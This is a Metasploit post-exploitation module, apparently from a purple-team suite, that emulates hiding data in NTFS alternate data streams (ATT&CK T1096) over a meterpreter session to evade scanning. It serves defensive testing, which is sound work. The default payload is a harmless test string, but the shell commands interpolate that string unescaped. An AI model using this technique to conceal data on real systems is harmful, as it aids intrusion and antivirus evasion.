##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Windows NTFS Extended Attributes (T1096) Windows - Purple Team',
                      'Description'   => %q{
                        Defense Evasion:
                        Data or executables may be stored in New Technology File System (NTFS) partition metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1096' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new('FILE', [ true, "File", 'C:\\t1096w.txt']),
      OptString.new('ALT_FILE', [ true, "Alternative path (file + alt_file)", ':t1096w-secret.txt']),
      OptString.new('ALT_STRING', [ true, "Append file", 'my secret string']),
      OptBool.new('CREATE', [ true, "Create file", true]),
      OptBool.new('CLEANUP', [ true, "Delete file (if we created it)", true]),
      OptBool.new('BACKUP', [ true, "Append file", true])
    ])
  end

  def run
    begin
      raise "Module requires meterpreter session" if session.type != "meterpreter"
      print_warning("This module requires administrator rights in its default configuration. Change FILE parameter to write to unprivileged location.") unless is_admin?

      file = datastore['FILE']
      alt_file = datastore['FILE'] + datastore['ALT_FILE']
      alt_string = datastore['ALT_STRING']
      backup = datastore['BACKUP']
      cleanup = datastore['CLEANUP']
      create = datastore['CREATE']
      file_created = false

      if exists?(file)
        print_status("The file already exists")
      else
        if create
          print_status("Creating file...")
          append_file(file,'this is a test')
          file_created = true
        end
      end

      print_status("Adding secret string to file...")

      tmp = file + "-" + Rex::Text::rand_text_alpha(6) + ".txt"
      run_cmd("echo #{alt_string} > #{tmp}")
      run_cmd("type #{tmp} > #{alt_file}")
      run_cmd("del #{tmp}")

      if file_created and cleanup
        print_status("Removing file...")
        rm_f(file)
      end

      print_good("Module T1096W execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1096W execution failed.")
    end
  end
end
